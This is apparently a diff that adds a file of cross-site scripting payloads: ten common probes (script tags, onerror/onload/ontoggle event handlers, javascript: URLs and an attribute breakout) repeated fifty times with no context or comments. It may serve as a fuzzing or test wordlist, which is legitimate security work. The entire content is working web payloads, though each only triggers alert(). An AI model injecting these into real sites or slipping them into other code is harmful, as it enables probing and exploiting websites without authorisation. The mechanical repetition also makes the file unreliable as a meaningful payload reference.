@@ -1,0 +1,500 @@
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src='javascript:alert(1)'></iframe>
+'><script>alert(document.domain)</script>
+<body onload=alert('xss')>
+<video><source onerror="alert('xss')">
+<details open ontoggle=alert(1)>
+<math href='javascript:alert(1)'>CLICK
+<link rel=stylesheet href=javascript:alert(1)>
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src='javascript:alert(1)'></iframe>
+'><script>alert(document.domain)</script>
+<body onload=alert('xss')>
+<video><source onerror="alert('xss')">
+<details open ontoggle=alert(1)>
+<math href='javascript:alert(1)'>CLICK
+<link rel=stylesheet href=javascript:alert(1)>
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src='javascript:alert(1)'></iframe>
+'><script>alert(document.domain)</script>
+<body onload=alert('xss')>
+<video><source onerror="alert('xss')">
+<details open ontoggle=alert(1)>
+<math href='javascript:alert(1)'>CLICK
+<link rel=stylesheet href=javascript:alert(1)>
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src='javascript:alert(1)'></iframe>
+'><script>alert(document.domain)</script>
+<body onload=alert('xss')>
+<video><source onerror="alert('xss')">
+<details open ontoggle=alert(1)>
+<math href='javascript:alert(1)'>CLICK
+<link rel=stylesheet href=javascript:alert(1)>
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src='javascript:alert(1)'></iframe>
+'><script>alert(document.domain)</script>
+<body onload=alert('xss')>
+<video><source onerror="alert('xss')">
+<details open ontoggle=alert(1)>
+<math href='javascript:alert(1)'>CLICK
+<link rel=stylesheet href=javascript:alert(1)>
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src='javascript:alert(1)'></iframe>
+'><script>alert(document.domain)</script>
+<body onload=alert('xss')>
+<video><source onerror="alert('xss')">
+<details open ontoggle=alert(1)>
+<math href='javascript:alert(1)'>CLICK
+<link rel=stylesheet href=javascript:alert(1)>
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src='javascript:alert(1)'></iframe>
+'><script>alert(document.domain)</script>
+<body onload=alert('xss')>
+<video><source onerror="alert('xss')">
+<details open ontoggle=alert(1)>
+<math href='javascript:alert(1)'>CLICK
+<link rel=stylesheet href=javascript:alert(1)>
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src='javascript:alert(1)'></iframe>
+'><script>alert(document.domain)</script>
+<body onload=alert('xss')>
+<video><source onerror="alert('xss')">
+<details open ontoggle=alert(1)>
+<math href='javascript:alert(1)'>CLICK
+<link rel=stylesheet href=javascript:alert(1)>
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src='javascript:alert(1)'></iframe>
+'><script>alert(document.domain)</script>
+<body onload=alert('xss')>
+<video><source onerror="alert('xss')">
+<details open ontoggle=alert(1)>
+<math href='javascript:alert(1)'>CLICK
+<link rel=stylesheet href=javascript:alert(1)>
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src='javascript:alert(1)'></iframe>
+'><script>alert(document.domain)</script>
+<body onload=alert('xss')>
+<video><source onerror="alert('xss')">
+<details open ontoggle=alert(1)>
+<math href='javascript:alert(1)'>CLICK
+<link rel=stylesheet href=javascript:alert(1)>
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src='javascript:alert(1)'></iframe>
+'><script>alert(document.domain)</script>
+<body onload=alert('xss')>
+<video><source onerror="alert('xss')">
+<details open ontoggle=alert(1)>
+<math href='javascript:alert(1)'>CLICK
+<link rel=stylesheet href=javascript:alert(1)>
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src='javascript:alert(1)'></iframe>
+'><script>alert(document.domain)</script>
+<body onload=alert('xss')>
+<video><source onerror="alert('xss')">
+<details open ontoggle=alert(1)>
+<math href='javascript:alert(1)'>CLICK
+<link rel=stylesheet href=javascript:alert(1)>
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src='javascript:alert(1)'></iframe>
+'><script>alert(document.domain)</script>
+<body onload=alert('xss')>
+<video><source onerror="alert('xss')">
+<details open ontoggle=alert(1)>
+<math href='javascript:alert(1)'>CLICK
+<link rel=stylesheet href=javascript:alert(1)>
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src='javascript:alert(1)'></iframe>
+'><script>alert(document.domain)</script>
+<body onload=alert('xss')>
+<video><source onerror="alert('xss')">
+<details open ontoggle=alert(1)>
+<math href='javascript:alert(1)'>CLICK
+<link rel=stylesheet href=javascript:alert(1)>
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src='javascript:alert(1)'></iframe>
+'><script>alert(document.domain)</script>
+<body onload=alert('xss')>
+<video><source onerror="alert('xss')">
+<details open ontoggle=alert(1)>
+<math href='javascript:alert(1)'>CLICK
+<link rel=stylesheet href=javascript:alert(1)>
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src='javascript:alert(1)'></iframe>
+'><script>alert(document.domain)</script>
+<body onload=alert('xss')>
+<video><source onerror="alert('xss')">
+<details open ontoggle=alert(1)>
+<math href='javascript:alert(1)'>CLICK
+<link rel=stylesheet href=javascript:alert(1)>
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src='javascript:alert(1)'></iframe>
+'><script>alert(document.domain)</script>
+<body onload=alert('xss')>
+<video><source onerror="alert('xss')">
+<details open ontoggle=alert(1)>
+<math href='javascript:alert(1)'>CLICK
+<link rel=stylesheet href=javascript:alert(1)>
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src='javascript:alert(1)'></iframe>
+'><script>alert(document.domain)</script>
+<body onload=alert('xss')>
+<video><source onerror="alert('xss')">
+<details open ontoggle=alert(1)>
+<math href='javascript:alert(1)'>CLICK
+<link rel=stylesheet href=javascript:alert(1)>
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src='javascript:alert(1)'></iframe>
+'><script>alert(document.domain)</script>
+<body onload=alert('xss')>
+<video><source onerror="alert('xss')">
+<details open ontoggle=alert(1)>
+<math href='javascript:alert(1)'>CLICK
+<link rel=stylesheet href=javascript:alert(1)>
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src='javascript:alert(1)'></iframe>
+'><script>alert(document.domain)</script>
+<body onload=alert('xss')>
+<video><source onerror="alert('xss')">
+<details open ontoggle=alert(1)>
+<math href='javascript:alert(1)'>CLICK
+<link rel=stylesheet href=javascript:alert(1)>
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src='javascript:alert(1)'></iframe>
+'><script>alert(document.domain)</script>
+<body onload=alert('xss')>
+<video><source onerror="alert('xss')">
+<details open ontoggle=alert(1)>
+<math href='javascript:alert(1)'>CLICK
+<link rel=stylesheet href=javascript:alert(1)>
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src='javascript:alert(1)'></iframe>
+'><script>alert(document.domain)</script>
+<body onload=alert('xss')>
+<video><source onerror="alert('xss')">
+<details open ontoggle=alert(1)>
+<math href='javascript:alert(1)'>CLICK
+<link rel=stylesheet href=javascript:alert(1)>
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src='javascript:alert(1)'></iframe>
+'><script>alert(document.domain)</script>
+<body onload=alert('xss')>
+<video><source onerror="alert('xss')">
+<details open ontoggle=alert(1)>
+<math href='javascript:alert(1)'>CLICK
+<link rel=stylesheet href=javascript:alert(1)>
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src='javascript:alert(1)'></iframe>
+'><script>alert(document.domain)</script>
+<body onload=alert('xss')>
+<video><source onerror="alert('xss')">
+<details open ontoggle=alert(1)>
+<math href='javascript:alert(1)'>CLICK
+<link rel=stylesheet href=javascript:alert(1)>
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src='javascript:alert(1)'></iframe>
+'><script>alert(document.domain)</script>
+<body onload=alert('xss')>
+<video><source onerror="alert('xss')">
+<details open ontoggle=alert(1)>
+<math href='javascript:alert(1)'>CLICK
+<link rel=stylesheet href=javascript:alert(1)>
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src='javascript:alert(1)'></iframe>
+'><script>alert(document.domain)</script>
+<body onload=alert('xss')>
+<video><source onerror="alert('xss')">
+<details open ontoggle=alert(1)>
+<math href='javascript:alert(1)'>CLICK
+<link rel=stylesheet href=javascript:alert(1)>
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src='javascript:alert(1)'></iframe>
+'><script>alert(document.domain)</script>
+<body onload=alert('xss')>
+<video><source onerror="alert('xss')">
+<details open ontoggle=alert(1)>
+<math href='javascript:alert(1)'>CLICK
+<link rel=stylesheet href=javascript:alert(1)>
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src='javascript:alert(1)'></iframe>
+'><script>alert(document.domain)</script>
+<body onload=alert('xss')>
+<video><source onerror="alert('xss')">
+<details open ontoggle=alert(1)>
+<math href='javascript:alert(1)'>CLICK
+<link rel=stylesheet href=javascript:alert(1)>
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src='javascript:alert(1)'></iframe>
+'><script>alert(document.domain)</script>
+<body onload=alert('xss')>
+<video><source onerror="alert('xss')">
+<details open ontoggle=alert(1)>
+<math href='javascript:alert(1)'>CLICK
+<link rel=stylesheet href=javascript:alert(1)>
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src='javascript:alert(1)'></iframe>
+'><script>alert(document.domain)</script>
+<body onload=alert('xss')>
+<video><source onerror="alert('xss')">
+<details open ontoggle=alert(1)>
+<math href='javascript:alert(1)'>CLICK
+<link rel=stylesheet href=javascript:alert(1)>
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src='javascript:alert(1)'></iframe>
+'><script>alert(document.domain)</script>
+<body onload=alert('xss')>
+<video><source onerror="alert('xss')">
+<details open ontoggle=alert(1)>
+<math href='javascript:alert(1)'>CLICK
+<link rel=stylesheet href=javascript:alert(1)>
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src='javascript:alert(1)'></iframe>
+'><script>alert(document.domain)</script>
+<body onload=alert('xss')>
+<video><source onerror="alert('xss')">
+<details open ontoggle=alert(1)>
+<math href='javascript:alert(1)'>CLICK
+<link rel=stylesheet href=javascript:alert(1)>
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src='javascript:alert(1)'></iframe>
+'><script>alert(document.domain)</script>
+<body onload=alert('xss')>
+<video><source onerror="alert('xss')">
+<details open ontoggle=alert(1)>
+<math href='javascript:alert(1)'>CLICK
+<link rel=stylesheet href=javascript:alert(1)>
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src='javascript:alert(1)'></iframe>
+'><script>alert(document.domain)</script>
+<body onload=alert('xss')>
+<video><source onerror="alert('xss')">
+<details open ontoggle=alert(1)>
+<math href='javascript:alert(1)'>CLICK
+<link rel=stylesheet href=javascript:alert(1)>
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src='javascript:alert(1)'></iframe>
+'><script>alert(document.domain)</script>
+<body onload=alert('xss')>
+<video><source onerror="alert('xss')">
+<details open ontoggle=alert(1)>
+<math href='javascript:alert(1)'>CLICK
+<link rel=stylesheet href=javascript:alert(1)>
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src='javascript:alert(1)'></iframe>
+'><script>alert(document.domain)</script>
+<body onload=alert('xss')>
+<video><source onerror="alert('xss')">
+<details open ontoggle=alert(1)>
+<math href='javascript:alert(1)'>CLICK
+<link rel=stylesheet href=javascript:alert(1)>
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src='javascript:alert(1)'></iframe>
+'><script>alert(document.domain)</script>
+<body onload=alert('xss')>
+<video><source onerror="alert('xss')">
+<details open ontoggle=alert(1)>
+<math href='javascript:alert(1)'>CLICK
+<link rel=stylesheet href=javascript:alert(1)>
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src='javascript:alert(1)'></iframe>
+'><script>alert(document.domain)</script>
+<body onload=alert('xss')>
+<video><source onerror="alert('xss')">
+<details open ontoggle=alert(1)>
+<math href='javascript:alert(1)'>CLICK
+<link rel=stylesheet href=javascript:alert(1)>
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src='javascript:alert(1)'></iframe>
+'><script>alert(document.domain)</script>
+<body onload=alert('xss')>
+<video><source onerror="alert('xss')">
+<details open ontoggle=alert(1)>
+<math href='javascript:alert(1)'>CLICK
+<link rel=stylesheet href=javascript:alert(1)>
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src='javascript:alert(1)'></iframe>
+'><script>alert(document.domain)</script>
+<body onload=alert('xss')>
+<video><source onerror="alert('xss')">
+<details open ontoggle=alert(1)>
+<math href='javascript:alert(1)'>CLICK
+<link rel=stylesheet href=javascript:alert(1)>
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src='javascript:alert(1)'></iframe>
+'><script>alert(document.domain)</script>
+<body onload=alert('xss')>
+<video><source onerror="alert('xss')">
+<details open ontoggle=alert(1)>
+<math href='javascript:alert(1)'>CLICK
+<link rel=stylesheet href=javascript:alert(1)>
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src='javascript:alert(1)'></iframe>
+'><script>alert(document.domain)</script>
+<body onload=alert('xss')>
+<video><source onerror="alert('xss')">
+<details open ontoggle=alert(1)>
+<math href='javascript:alert(1)'>CLICK
+<link rel=stylesheet href=javascript:alert(1)>
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src='javascript:alert(1)'></iframe>
+'><script>alert(document.domain)</script>
+<body onload=alert('xss')>
+<video><source onerror="alert('xss')">
+<details open ontoggle=alert(1)>
+<math href='javascript:alert(1)'>CLICK
+<link rel=stylesheet href=javascript:alert(1)>
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src='javascript:alert(1)'></iframe>
+'><script>alert(document.domain)</script>
+<body onload=alert('xss')>
+<video><source onerror="alert('xss')">
+<details open ontoggle=alert(1)>
+<math href='javascript:alert(1)'>CLICK
+<link rel=stylesheet href=javascript:alert(1)>
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src='javascript:alert(1)'></iframe>
+'><script>alert(document.domain)</script>
+<body onload=alert('xss')>
+<video><source onerror="alert('xss')">
+<details open ontoggle=alert(1)>
+<math href='javascript:alert(1)'>CLICK
+<link rel=stylesheet href=javascript:alert(1)>
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src='javascript:alert(1)'></iframe>
+'><script>alert(document.domain)</script>
+<body onload=alert('xss')>
+<video><source onerror="alert('xss')">
+<details open ontoggle=alert(1)>
+<math href='javascript:alert(1)'>CLICK
+<link rel=stylesheet href=javascript:alert(1)>
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src='javascript:alert(1)'></iframe>
+'><script>alert(document.domain)</script>
+<body onload=alert('xss')>
+<video><source onerror="alert('xss')">
+<details open ontoggle=alert(1)>
+<math href='javascript:alert(1)'>CLICK
+<link rel=stylesheet href=javascript:alert(1)>
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src='javascript:alert(1)'></iframe>
+'><script>alert(document.domain)</script>
+<body onload=alert('xss')>
+<video><source onerror="alert('xss')">
+<details open ontoggle=alert(1)>
+<math href='javascript:alert(1)'>CLICK
+<link rel=stylesheet href=javascript:alert(1)>
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src='javascript:alert(1)'></iframe>
+'><script>alert(document.domain)</script>
+<body onload=alert('xss')>
+<video><source onerror="alert('xss')">
+<details open ontoggle=alert(1)>
+<math href='javascript:alert(1)'>CLICK
+<link rel=stylesheet href=javascript:alert(1)>
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src='javascript:alert(1)'></iframe>
+'><script>alert(document.domain)</script>
+<body onload=alert('xss')>
+<video><source onerror="alert('xss')">
+<details open ontoggle=alert(1)>
+<math href='javascript:alert(1)'>CLICK
+<link rel=stylesheet href=javascript:alert(1)>
